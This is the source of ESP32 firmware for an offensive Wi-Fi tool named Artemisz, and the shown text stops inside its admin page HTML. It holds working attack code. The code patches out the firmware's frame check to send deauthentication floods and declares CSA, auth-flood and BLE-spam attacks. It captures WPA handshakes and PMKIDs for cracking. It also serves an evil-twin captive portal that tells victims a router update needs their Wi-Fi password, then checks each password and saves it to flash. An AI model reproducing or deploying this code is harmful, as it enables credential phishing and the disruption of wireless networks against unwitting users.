#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <SPI.h>
#include <TFT_eSPI.h>
#include <Preferences.h>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_gap_ble_api.h>

// Hardware-independent parsing/serialization, unit-tested on the host.
// See lib/artemisz_core/ and TESTING.md.
#include "frame80211.h"
#include "eapol.h"
#include "pcap.h"
#include "hccapx.h"
#include "hexfmt.h"

// Bypass ESP-IDF Wi-Fi Stack Libraries restriction on sending management frames
// Without this, deauth/disassoc frames (0xC0, 0xA0) are silently dropped by the firmware
// Ref: risinek/esp32-wifi-penetration-tool, GANESH-ICMC/esp32-deauther, ESP32Marauder
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

// Forward declarations (required by PlatformIO / plain C++)
void IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);
void clearClients();
void clearArray();
void saveCredsToNVS();
void loadCredsFromNVS();
String header(String t);
String index();
String posted();
String footer();
void performScan();
void handleResult();
bool isAuthenticated();
void handleAdmin();
void handleCaptivePortal();
void handleCaptiveAndroid();
void handleNotFound();
void switchAPConfig(const char* ssid, const char* password, uint8_t channel);
void handleIndex();
String bytesToStr(const uint8_t* b, uint32_t size);
String htmlEscape(const String& s);
void sendKarmaBeacon(const char* ssid);
void handlePcapDownload();
void updateDisplay();
void displayCredentials();
void handleButtons();
void initBLE();
void stopBLE();
void sendBLESpam();
void sendProbeFlood();
void sendRandomBeacon();
void sendAPCloneBeacon();
void sendRickRollBeacons();
void sendCSABeacon();
void sendAuthFlood();
void handleHccapxDownload();
void handleSerialCLI();
void drawSignalMonitor();

// Fallback pin definitions in case User_Setup.h isn't picked up by TFT_eSPI
#ifndef TFT_BL
#define TFT_BL 15
#endif

#define SUBTITLE "Security Check Required"
#define TITLE "Reconnect to WiFi"
#define BODY "A firmware update has reset your router's session. Please re-enter your WiFi password to restore your connection."
#define POST_TITLE "Connecting..."
#define POST_BODY "Verifying credentials and restoring your connection. This may take up to 30 seconds. Do not close this page."
#define UP_BTN 12        // Button to navigate up in network list
#define DOWN_BTN 13      // Button to navigate down in network list
#define DEAUTH_BTN 14    // Button to toggle deauth attack
#define EVILTWIN_BTN 27  // Button to toggle evil twin attack
#define CREDS_BTN 33     // Button to show saved credentials on display

// Admin panel credentials (Fix #10)
#define ADMIN_USER "admin"
#define ADMIN_PASS "artemisz1337"

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;     // Fix #2: store signal strength
}  _Network;

// Fix #9: multi-credential log
#define MAX_CREDS 20
struct _Credential {
  String ssid;
  String password;
  bool verified;
};
_Credential _credLog[MAX_CREDS];
int _credCount = 0;

Preferences preferences;

// Display state: false = main view, true = credentials view
bool showingCreds = false;
int credsScrollOffset = 0;  // For scrolling through creds on display


const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer webServer(80);

#define MAX_NETWORKS 32              // Fix #8: raised from 16
_Network _networks[MAX_NETWORKS];
_Network _selectedNetwork;

TFT_eSPI tft = TFT_eSPI();

// Fix #4: client MAC tracking for targeted deauth
#define MAX_CLIENTS 16
uint8_t _clientMACs[MAX_CLIENTS][6];
int _clientCount = 0;

// Switch radio to target channel for deauth without tearing down the admin AP
// esp_wifi_set_config() updates the AP's channel in-place — no disconnect needed
void syncAPChannel() {
  if (_selectedNetwork.ssid.length() == 0 || _selectedNetwork.ch == 0) return;
  wifi_config_t conf;
  esp_wifi_get_config(WIFI_IF_AP, &conf);
  conf.ap.channel = _selectedNetwork.ch;
  esp_wifi_set_config(WIFI_IF_AP, &conf);
  esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
  Serial.printf("[*] Radio moved to ch %d for deauth\n", _selectedNetwork.ch);
}

// Switch AP to new SSID/password/channel and re-enable promiscuous mode
void switchAPConfig(const char* ssid, const char* password, uint8_t channel) {
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  if (password && password[0]) {
    WiFi.softAP(ssid, password, channel);
  } else {
    WiFi.softAP(ssid, NULL, channel);
  }
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  // Re-enable promiscuous mode — softAPdisconnect can reset it
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  Serial.printf("[*] AP switched to SSID='%s' ch=%d\n", ssid, channel);
}

// Karma attack — probe request logging
#define MAX_PROBES 32
#define MAX_SSID_LEN 33
struct _ProbeReq {
  uint8_t clientMAC[6];
  char ssid[MAX_SSID_LEN];
  int32_t rssi;
  uint16_t count;
};
_ProbeReq _probes[MAX_PROBES];
volatile int _probeCount = 0;
bool karmaActive = false;
unsigned long _karmaBeaconTimer = 0;

// Beacon Spam — flood area with fake SSIDs
bool beaconSpamActive = false;
unsigned long _beaconSpamTimer = 0;
const char* _spamSSIDs[] = {
  "Free WiFi", "Starbucks WiFi", "Airport Free WiFi", "Hotel Guest",
  "xfinity", "NETGEAR", "linksys", "FBI Surveillance Van",
  "NSA_PRISM_Node_42", "Get Off My LAN", "Pretty Fly for a WiFi",
  "Tell My WiFi Love Her", "Wu Tang LAN", "Bill Wi the Science Fi",
  "The LAN Before Time", "Abraham Linksys", "Martin Router King",
  "Drop It Like Its Hotspot", "Nacho WiFi", "LAN Solo",
  "It Burns When IP", "Silence of the LANs", "Series of Tubes",
  "Bandwidth Together", "Virus Detected!", "Loading...",
  "No Internet Access", "Click Here For WiFi", "404 Not Found",
  "Access Denied"
};
#define BEACON_SPAM_COUNT 30

// Multi-target deauth — round-robin all scanned networks
bool deauthAllActive = false;
int _deauthRobinIdx = 0;

// CSA Attack — Channel Switch Announcement (bypasses PMF/WPA3)
bool csaAttackActive = false;
unsigned long _csaTimer = 0;
uint8_t _csaTargetCh = 1;

// Auth Flood — exhaust AP's client association table
bool authFloodActive = false;
unsigned long _authFloodTimer = 0;

// Nuke mode — combined deauth + CSA + auth flood
bool nukeActive = false;

// Evil Twin grace period — pause deauth to let DNS/HTTP serve captive portal
unsigned long _etGraceUntil = 0;
int _lastStationCount = 0;

// Channel hopping for passive sniffing
uint8_t _hopChannel = 1;
unsigned long _channelHopTimer = 0;

// PMKID capture
#define MAX_PMKID 10
struct _PMKID {
  uint8_t bssid[6];
  uint8_t client[6];
  uint8_t pmkid[16];
};
_PMKID _pmkids[MAX_PMKID];
int _pmkidCount = 0;

// Deauth detection
volatile uint32_t _deauthDetected = 0;
volatile int8_t _deauthLastRSSI = 0;
unsigned long _lastDeauthAlert = 0;
bool deauthDetectActive = false;

// BLE Spam attacks
bool bleSpamActive = false;
uint8_t bleSpamType = 0; // 0=SourApple, 1=Swiftpair, 2=Samsung
unsigned long _bleSpamTimer = 0;
bool _bleInitialized = false;

// Probe Request Flood
bool probeFloodActive = false;
unsigned long _probeFloodTimer = 0;

// Random Beacon Spam
bool randomBeaconActive = false;
unsigned long _randomBeaconTimer = 0;

// AP Clone Spam
bool apCloneSpamActive = false;
unsigned long _apCloneTimer = 0;

// Rick Roll Beacon
bool rickRollActive = false;
unsigned long _rickRollTimer = 0;
const char* _rickRollSSIDs[] = {
  "Never Gonna Give You Up",
  "Never Gonna Let You Down",
  "Never Gonna Run Around",
  "And Desert You",
  "Never Gonna Make You Cry",
  "Never Gonna Say Goodbye",
  "Never Gonna Tell A Lie",
  "And Hurt You",
  "Weve Known Each Other",
  "For So Long",
  "Your Hearts Been Aching But",
  "Youre Too Shy To Say It",
  "Inside We Both Know",
  "Whats Been Going On",
  "We Know The Game And",
  "Were Gonna Play It"
};
#define RICKROLL_COUNT 16

// Signal Monitor
bool signalMonitorActive = false;
bool _sigMonHeaderDrawn = false;
volatile int8_t _lastTargetRSSI = -100;
#define SIG_MON_WIDTH 170
int8_t _rssiHistory[SIG_MON_WIDTH];
int _rssiHistIdx = 0;
unsigned long _sigMonTimer = 0;

// Serial CLI
String _serialBuffer = "";

// EAPOL handshake capture
#define MAX_RAW_PKT 400
#define MAX_HANDSHAKES 5
struct _HandshakePkt {
  uint8_t data[MAX_RAW_PKT];
  uint16_t len;
};
struct _Handshake {
  uint8_t bssid[6];
  uint8_t client[6];
  uint8_t msgMask;       // bits 0-3 for msg 1-4
  uint8_t anonce[32];    // from msg1
  _HandshakePkt pkts[4]; // raw 802.11 frames for PCAP export
};
_Handshake _handshakes[MAX_HANDSHAKES];
int _handshakeCount = 0;

// Promiscuous RX callback — sniff probes, EAPOL, and client MACs
void IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;

  uint8_t frameType = (payload[0] >> 2) & 0x03;
  uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;

  // --- Probe Request sniffing (for Karma) ---
  if (type == WIFI_PKT_MGMT && frameType == 0 && frameSubtype == 4 && len > 26) {
    uint8_t tagNum = payload[24];
    uint8_t tagLen = payload[25];
    if (tagNum == 0 && tagLen > 0 && tagLen < MAX_SSID_LEN && (26 + tagLen) <= len) {
      const uint8_t* srcMAC = payload + 10;
      if (srcMAC[0] & 0x01) return;
      for (int i = 0; i < _probeCount; i++) {
        if (memcmp(_probes[i].clientMAC, srcMAC, 6) == 0 &&
            memcmp(_probes[i].ssid, payload + 26, tagLen) == 0 &&
            _probes[i].ssid[tagLen] == '\0') {
          _probes[i].count++;
          _probes[i].rssi = pkt->rx_ctrl.rssi;
          return;
        }
      }
      if (_probeCount < MAX_PROBES) {
        memcpy(_probes[_probeCount].clientMAC, srcMAC, 6);
        memcpy(_probes[_probeCount].ssid, payload + 26, tagLen);
        _probes[_probeCount].ssid[tagLen] = '\0';
        _probes[_probeCount].rssi = pkt->rx_ctrl.rssi;
        _probes[_probeCount].count = 1;
        _probeCount++;
      }
    }
    return;
  }

  // --- Deauth/Disassoc detection ---
  if (deauthDetectActive && type == WIFI_PKT_MGMT && frameType == 0 &&
      (frameSubtype == 12 || frameSubtype == 10)) {
    _deauthDetected++;
    _deauthLastRSSI = pkt->rx_ctrl.rssi;
  }

  // --- Signal monitor: track target AP beacon RSSI ---
  if (signalMonitorActive && type == WIFI_PKT_MGMT && frameType == 0 &&
      frameSubtype == 8 && len > 22) {
    if (_selectedNetwork.ssid.length() > 0 &&
        memcmp(payload + 16, _selectedNetwork.bssid, 6) == 0) {
      _lastTargetRSSI = pkt->rx_ctrl.rssi;
    }
  }

  // --- Below: only process frames matching target BSSID ---
  const uint8_t* addr1 = payload + 4;
  const uint8_t* addr2 = payload + 10;
  const uint8_t* addr3 = payload + 16;

  if (_selectedNetwork.ssid.length() == 0) return;
  if (memcmp(addr3, _selectedNetwork.bssid, 6) != 0) return;

  // --- EAPOL handshake capture (data frames) ---
  // Frame/EAPOL parsing & PMKID extraction live in the tested artemisz_core
  // library; this block only performs the capture bookkeeping into the global
  // handshake store.
  if (type == WIFI_PKT_DATA && frameType == 2) {
    int hdrLen = artemisz::dataHeaderLen(payload[0]);
    int eapolOff = artemisz::eapolOffsetIn80211(payload, len, hdrLen);
    if (eapolOff > 0) {
      const uint8_t* eapol = payload + eapolOff;
      int eapolAvail = (int)len - eapolOff;
      int msgNum = artemisz::eapolKeyMessageNumber(eapol, eapolAvail);
      if (msgNum > 0) {
        const uint8_t* apMAC = _selectedNetwork.bssid;
        const uint8_t* clientMAC = (memcmp(addr2, apMAC, 6) == 0) ? addr1 : addr2;
        int hsIdx = -1;
        for (int i = 0; i < _handshakeCount; i++) {
          if (memcmp(_handshakes[i].bssid, apMAC, 6) == 0 &&
              memcmp(_handshakes[i].client, clientMAC, 6) == 0) {
            hsIdx = i; break;
          }
        }
        if (hsIdx < 0 && _handshakeCount < MAX_HANDSHAKES) {
          hsIdx = _handshakeCount;
          memset(&_handshakes[hsIdx], 0, sizeof(_Handshake));
          memcpy(_handshakes[hsIdx].bssid, apMAC, 6);
          memcpy(_handshakes[hsIdx].client, clientMAC, 6);
          _handshakeCount++;
        }
        if (hsIdx >= 0) {
          int idx = msgNum - 1;
          uint16_t copyLen = (len > MAX_RAW_PKT) ? MAX_RAW_PKT : len;
          memcpy(_handshakes[hsIdx].pkts[idx].data, payload, copyLen);
          _handshakes[hsIdx].pkts[idx].len = copyLen;
          _handshakes[hsIdx].msgMask |= (1 << idx);
          if (msgNum == 1) {
            artemisz::eapolKeyNonce(eapol, eapolAvail, _handshakes[hsIdx].anonce);
          }
          // PMKID extraction from msg1 Key Data
          if (msgNum == 1 && _pmkidCount < MAX_PMKID) {
            uint8_t pmkid[16];
            if (artemisz::extractPmkid(eapol, eapolAvail, pmkid)) {
              memcpy(_pmkids[_pmkidCount].bssid, apMAC, 6);
              memcpy(_pmkids[_pmkidCount].client, clientMAC, 6);
              memcpy(_pmkids[_pmkidCount].pmkid, pmkid, 16);
              _pmkidCount++;
            }
          }
        }
      }
    }
  }

  // --- Client MAC tracking for deauth ---
  if (memcmp(addr2, _selectedNetwork.bssid, 6) == 0) return;
  if (addr2[0] & 0x01) return;
  for (int i = 0; i < _clientCount; i++) {
    if (memcmp(_clientMACs[i], addr2, 6) == 0) return;
  }
  if (_clientCount < MAX_CLIENTS) {
    memcpy(_clientMACs[_clientCount], addr2, 6);
    _clientCount++;
  }
}

void clearClients() {
  _clientCount = 0;
  memset(_clientMACs, 0, sizeof(_clientMACs));
}

bool lastUpState = HIGH;
bool lastDownState = HIGH;
bool lastDeauthState = HIGH;
bool lastEvilTwinState = HIGH;
bool lastCredsState = HIGH;
unsigned long lastDebounceUp      = 0;
unsigned long lastDebounceDown    = 0;
unsigned long lastDebounceDeauth  = 0;
unsigned long lastDebounceEvil    = 0;
unsigned long lastDebounceCreds   = 0;
const unsigned long debounceDelay = 200;
int currentTargetIndex = 0;

void clearArray() {
  for (int i = 0; i < MAX_NETWORKS; i++) {
    _networks[i] = _Network();
  }
}

// Persistent credential storage using ESP32 NVS flash
void saveCredsToNVS() {
  preferences.begin("art-creds", false);
  preferences.putInt("count", _credCount);
  for (int i = 0; i < _credCount; i++) {
    String prefix = "c" + String(i);
    preferences.putString((prefix + "s").c_str(), _credLog[i].ssid);
    preferences.putString((prefix + "p").c_str(), _credLog[i].password);
    preferences.putBool((prefix + "v").c_str(), _credLog[i].verified);
  }
  preferences.end();
}

void loadCredsFromNVS() {
  preferences.begin("art-creds", false);  // read-write to auto-create namespace on first boot
  _credCount = preferences.getInt("count", 0);
  if (_credCount > MAX_CREDS) _credCount = MAX_CREDS;
  for (int i = 0; i < _credCount; i++) {
    String prefix = "c" + String(i);
    _credLog[i].ssid     = preferences.getString((prefix + "s").c_str(), "");
    _credLog[i].password = preferences.getString((prefix + "p").c_str(), "");
    _credLog[i].verified = preferences.getBool((prefix + "v").c_str(), false);
  }
  preferences.end();
  Serial.print("[*] Loaded ");
  Serial.print(_credCount);
  Serial.println(" credentials from flash");
}

// Fix #9: _correct / _tryPassword replaced by _credLog[] above
// _correct kept as a display summary of latest verified credential
String _correct = "";
String _tryPassword = "";
bool _awaitingVerification = false;  // Fix #6: explicit verification state
unsigned long _verifyStartTime = 0;  // Timeout for WiFi verification
const unsigned long VERIFY_TIMEOUT = 10000; // 10 seconds

unsigned long now = 0;
unsigned long deauth_now = 0;
unsigned long display_refresh = 0;


String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#f0f2f5;color:#1a1a1a;font-family:-apple-system,'Segoe UI','Helvetica Neue',sans-serif;min-height:100vh}"
    ".top{background:#fff;border-bottom:1px solid #e0e0e0;padding:14px 20px;display:flex;align-items:center;justify-content:center;gap:10px}"
    ".top svg{flex-shrink:0}"
    ".top span{font-size:.82rem;color:#666;font-weight:500}"
    ".wrap{max-width:420px;margin:0 auto;padding:40px 16px 20px}"
    ".ico{text-align:center;margin-bottom:20px}"
    ".ico svg{width:48px;height:48px}"
    ".card{background:#fff;border-radius:12px;padding:28px 24px;box-shadow:0 1px 3px rgba(0,0,0,.08),0 4px 12px rgba(0,0,0,.05)}"
    ".card h1{font-size:1.2rem;font-weight:600;margin-bottom:4px;color:#1a1a1a;text-align:center}"
    ".card .sub{text-align:center;font-size:.78rem;color:#888;margin-bottom:20px}"
    ".fg{position:relative;margin-bottom:16px}"
    ".fg label{display:block;font-size:.78rem;font-weight:600;color:#555;margin-bottom:6px}"
    ".fg input{width:100%;padding:12px 44px 12px 14px;border:1.5px solid #d0d5dd;border-radius:8px;font-size:.95rem;transition:border .2s;outline:none;background:#fafafa}"
    ".fg input:focus{border-color:#1a73e8;background:#fff;box-shadow:0 0 0 3px rgba(26,115,232,.1)}"
    ".eye{position:absolute;right:12px;top:32px;cursor:pointer;color:#aaa;padding:4px}"
    ".btn{width:100%;padding:13px;border:none;border-radius:8px;font-size:.92rem;font-weight:600;cursor:pointer;transition:all .15s}"
    ".btn-p{background:#1a73e8;color:#fff}"
    ".btn-p:hover{background:#1557b0;box-shadow:0 2px 8px rgba(26,115,232,.3)}"
    ".btn-p:active{transform:scale(.98)}"
    ".sec{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:16px;padding:10px;background:#f8f9fa;border-radius:8px}"
    ".sec svg{flex-shrink:0}"
    ".sec span{font-size:.7rem;color:#888}"
    ".ft{text-align:center;padding:16px;font-size:.68rem;color:#bbb}"
    ".ld{display:inline-block;width:18px;height:18px;border:2.5px solid #e0e0e0;border-top-color:#1a73e8;border-radius:50%;animation:sp .7s linear infinite;vertical-align:middle;margin-right:8px}"
    "@keyframes sp{to{transform:rotate(360deg)}}";
  String h = "<!DOCTYPE html><html lang='en'>"
    "<head><title>"+a+" - "+t+"</title>"
    "<meta name=viewport content='width=device-width,initial-scale=1'>"
    "<meta name=format-detection content='telephone=no'>"
    "<style>"+CSS+"</style></head>"
    "<body>"
    "<div class='top'>"
    "<svg viewBox='0 0 24 24' width='18' height='18' fill='none' stroke='#1a73e8' stroke-width='2'><path d='M5 12.55a11 11 0 0114 0'/><path d='M1.42 9a16 16 0 0121.16 0'/><path d='M8.53 16.11a6 6 0 016.95 0'/><circle cx='12' cy='20' r='1' fill='#1a73e8'/></svg>"
    "<span>"+a+"</span></div>"
    "<div class='wrap'>";
  return h;
}

String index() {
  return header(TITLE) +
    "<div class='ico'><svg viewBox='0 0 24 24' width='48' height='48' fill='none' stroke='#d0d5dd' stroke-width='1.5'><rect x='2' y='3' width='20' height='14' rx='2'/><line x1='8' y1='21' x2='16' y2='21'/><line x1='12' y1='17' x2='12' y2='21'/></svg></div>"
    "<div class='card'><h1>" + TITLE + "</h1>"
    "<div class='sub'>" + BODY + "</div>"
    "<form action='/' id='f'>"
    "<div class='fg'><label>WiFi Password</label>"
    "<input type=password name=password id=pw placeholder='Min 8 characters' required minlength='8' autocomplete=off>"
    "<div class='eye' onclick=\"var p=document.getElementById('pw');p.type=p.type==='password'?'text':'password'\">"
    "<svg viewBox='0 0 24 24' width='20' height='20' fill='none' stroke='currentColor' stroke-width='2'><path d='M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z'/><circle cx='12' cy='12' r='3'/></svg></div></div>"
    "<button type=submit class='btn btn-p'>Connect</button></form>"
    "<div class='sec'>"
    "<svg viewBox='0 0 24 24' width='14' height='14' fill='none' stroke='#888' stroke-width='2'><rect x='3' y='11' width='18' height='11' rx='2'/><path d='M7 11V7a5 5 0 0110 0v4'/></svg>"
    "<span>Secured with WPA2 encryption</span></div>"
    "</div></div>" + footer();
}

String posted() {
  return header(POST_TITLE) +
    "<div class='card' style='text-align:center;padding:40px 24px'>"
    "<div class='ld'></div>"
    "<h1 style='display:inline;vertical-align:middle'>" + POST_TITLE + "</h1>"
    "<p style='color:#888;font-size:.82rem;margin-top:16px;line-height:1.6'>" + POST_BODY + "</p>"
    "<div style='margin-top:20px;padding:12px;background:#f0f7ff;border-radius:8px;border:1px solid #d6e8ff'>"
    "<span style='font-size:.72rem;color:#1a73e8'>Your connection will be restored automatically</span></div>"
    "<script>setTimeout(function(){window.location.href='/result';},5000);</script>"
    "</div></div>" + footer();
}

String footer() {
  return "<div class='ft'>Protected by network security &middot; &copy; 2024</div></body></html>";
}

void setup() {
  // Initialize display
  tft.init();
  tft.setRotation(0); // Change from 3 to 0 for vertical orientation
  delay(100); // Add delay to ensure display initializes properly
  
  // Turn on backlight with full brightness
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  
  tft.fillScreen(TFT_BLACK);

  // Boot animation — scan line sweep
  for (int y = 0; y < 320; y += 4) {
    tft.drawFastHLine(0, y, 170, tft.color565(25, 0, 0));
    delay(2);
  }

  // Red double-border frame
  tft.drawRect(10, 50, 150, 70, TFT_RED);
  tft.drawRect(11, 51, 148, 68, TFT_RED);

  // ARTEMISZ title centered
  tft.setTextSize(2);
  tft.setTextColor(TFT_RED, TFT_BLACK);
  tft.setCursor(37, 70);
  tft.print("ARTEMISZ");

  // Subtitle
  tft.setTextSize(1);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
  tft.setCursor(52, 100);
  tft.print("by ssnrshnn");

  delay(300);

  // Loading bar
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(37, 155);
  tft.print("Initializing...");

  int barX = 20, barY = 175, barW = 130, barH = 6;
  tft.drawRect(barX - 1, barY - 1, barW + 2, barH + 2, tft.color565(30, 30, 40));
  for (int i = 0; i <= barW; i += 2) {
    tft.fillRect(barX, barY, i, barH, TFT_RED);
    delay(12);
  }

  // Ready
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(64, 200);
  tft.print("READY");
  delay(400);
  
  Serial.begin(115200);
  esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT); // Free Classic BT RAM
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_max_tx_power(78);  // Max 19.5dBm — stronger signal range
  
  esp_wifi_set_promiscuous(true);
  // Fix #4: register sniffer to collect client MACs from target AP
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  // Only capture management + data frames (reduces CPU load from control frames)
  wifi_promiscuous_filter_t promFilter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
  esp_wifi_set_promiscuous_filter(&promFilter);
  
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("Artemisz", "Eviltwin");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/pcap", handlePcapDownload);
  webServer.on("/hccapx", handleHccapxDownload);
  // Captive portal detection endpoints — triggers auto sign-in popup on all platforms
  // Apple iOS/macOS — serve portal HTML directly (faster than 302)
  webServer.on("/hotspot-detect.html", handleCaptivePortal);
  webServer.on("/library/test/success.html", handleCaptivePortal);
  webServer.on("/library/test/success", handleCaptivePortal);
  // Android — 302 redirect triggers "Sign in to network" notification
  webServer.on("/generate_204", handleCaptiveAndroid);
  webServer.on("/gen_204", handleCaptiveAndroid);
  webServer.on("/connectivitycheck", handleCaptiveAndroid);
  webServer.on("/mobile/status.php", handleCaptiveAndroid);            // Samsung
  // Windows — serve portal HTML directly
  webServer.on("/connecttest.txt", handleCaptivePortal);
  webServer.on("/ncsi.txt", handleCaptivePortal);
  webServer.on("/fwlink", handleCaptivePortal);
  webServer.on("/redirect", handleCaptivePortal);
  // Firefox / other
  webServer.on("/success.txt", handleCaptivePortal);
  webServer.on("/canonical.html", handleCaptivePortal);
  webServer.on("/chat", handleCaptivePortal);                          // Firefox
  webServer.onNotFound(handleNotFound);
  webServer.begin();
  
  // Set up buttons with internal pull-up resistors
  pinMode(UP_BTN, INPUT_PULLUP);
  pinMode(DOWN_BTN, INPUT_PULLUP);
  pinMode(DEAUTH_BTN, INPUT_PULLUP);
  pinMode(EVILTWIN_BTN, INPUT_PULLUP);
  pinMode(CREDS_BTN, INPUT_PULLUP);
  
  // Load saved credentials from flash
  loadCredsFromNVS();

  // Initial scan so the display is immediately usable
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.println("Scanning networks...");
  performScan();
  now = millis();  // reset scan timer
  updateDisplay();
}

void performScan() {
  int n = WiFi.scanNetworks(false, false, false, 120); // 120ms/channel (faster scan)
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < MAX_NETWORKS; ++i) {
      _Network network;
      network.ssid   = WiFi.SSID(i);
      network.ch     = WiFi.channel(i);
      network.rssi   = WiFi.RSSI(i);   // Fix #2: capture signal strength
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      _networks[i] = network;
    }
  }
  // Re-sync currentTargetIndex to the selected network's new position
  if (_selectedNetwork.ssid != "") {
    String selBssid = bytesToStr(_selectedNetwork.bssid, 6);
    currentTargetIndex = 0;
    for (int i = 0; i < MAX_NETWORKS; i++) {
      if (_networks[i].ssid == "" ) break;
      if (bytesToStr(_networks[i].bssid, 6) == selBssid) {
        currentTargetIndex = i;
        break;
      }
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  // Fix #6: use explicit verification state instead of racing WiFi.status()
  // WiFi.begin() was called in a previous request; check proper connection state
  wl_status_t wifiStatus = WiFi.status();
  
  if (!_awaitingVerification) {
    // No pending attempt — redirect to portal
    webServer.sendHeader("Location", "/");
    webServer.send(302, "text/plain", "");
    return;
  }

  if (wifiStatus == WL_CONNECTED) {
    deauthing_active = false;  // Auto-stop deauth on verified password
    // Fix #9: store in credential log
    if (_credCount < MAX_CREDS) {
      _credLog[_credCount].ssid     = _selectedNetwork.ssid;
      _credLog[_credCount].password = _tryPassword;
      _credLog[_credCount].verified = true;
      _credCount++;
      saveCredsToNVS();
    }
    _correct = "[VERIFIED] " + _selectedNetwork.ssid + " -> " + _tryPassword;
    _awaitingVerification = false;

    webServer.send(200, "text/html",
      "<html><head><meta name='viewport' content='initial-scale=1.0,width=device-width'></head>"
      "<body style='font-family:Segoe UI,system-ui,sans-serif;background:#0a0a0f;color:#c4c4c4;padding:2em;'>"
      "<h2 style='color:#20c20e'>Password accepted!</h2>"
      "<p>Reconnecting to the network...</p></body></html>");

    hotspot_active = false;
    csaAttackActive = false;
    switchAPConfig("Artemisz", "Eviltwin", 1);

    Serial.println("[+] Verified: " + _correct);
  } else if (wifiStatus == WL_CONNECT_FAILED || wifiStatus == WL_NO_SSID_AVAIL) {
    // Fix #9: log unverified attempt too
    if (_credCount < MAX_CREDS) {
      _credLog[_credCount].ssid     = _selectedNetwork.ssid;
      _credLog[_credCount].password = _tryPassword;
      _credLog[_credCount].verified = false;
      _credCount++;
      saveCredsToNVS();
    }
    _awaitingVerification = false;
    Serial.println("[-] Wrong password: " + _tryPassword);
    webServer.send(200, "text/html",
      "<html><head><script>setTimeout(function(){window.location.href='/';},3000);</script>"
      "<meta name='viewport' content='initial-scale=1.0,width=device-width'></head>"
      "<body style='font-family:Segoe UI,system-ui,sans-serif;background:#0a0a0f;color:#c4c4c4;padding:2em;'>"
      "<h2 style='color:#F04747'>Wrong Password</h2><p>Please try again.</p></body></html>");
  } else {
    // Still connecting — check for timeout
    if (millis() - _verifyStartTime > VERIFY_TIMEOUT) {
      // Timed out — log as unverified
      WiFi.disconnect();
      if (_credCount < MAX_CREDS) {
        _credLog[_credCount].ssid     = _selectedNetwork.ssid;
        _credLog[_credCount].password = _tryPassword;
        _credLog[_credCount].verified = false;
        _credCount++;
        saveCredsToNVS();
      }
      _awaitingVerification = false;
      Serial.println("[-] Verification timed out: " + _tryPassword);
      webServer.send(200, "text/html",
        "<html><head><script>setTimeout(function(){window.location.href='/';},3000);</script>"
        "<meta name='viewport' content='initial-scale=1.0,width=device-width'></head>"
        "<body style='font-family:Segoe UI,system-ui,sans-serif;background:#0a0a0f;color:#c4c4c4;padding:2em;'>"
        "<h2 style='color:#F04747'>Connection timed out</h2><p>Please try again.</p></body></html>");
    } else {
      // Still within timeout — ask client to wait and retry
      webServer.send(200, "text/html",
        "<html><head>"
        "<meta http-equiv='refresh' content='2;url=/result'>"
        "<meta name='viewport' content='initial-scale=1.0,width=device-width'></head>"
        "<body style='font-family:Segoe UI,system-ui,sans-serif;background:#0a0a0f;color:#c4c4c4;padding:2em;'>"
        "<h2>Validating...</h2><p>Please wait.</p></body></html>");
      return; // do not clear _awaitingVerification — still pending
    }
  }
  updateDisplay();
}

// Admin panel HTML template — stored in flash
const char _tempHTML[] = R"=====(
<html>
<head>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Artemisz</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0f;color:#c4c4c4;font-family:'Segoe UI',system-ui,-apple-system,sans-serif}
::-webkit-scrollbar{height:4px;width:4px}
::-webkit-scrollbar-thumb{background:#1e1e2e;border-radius:2px}
.hdr{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);padding:2em 1em;border-bottom:3px solid #e94560;text-align:center}
.hdr h1{font-size:2rem;font-weight:200;letter-spacing:.5em;color:#e94560;text-transform:uppercase}
.hdr p{font-size:.68rem;color:#445;letter-spacing:.2em;margin-top:.4em}
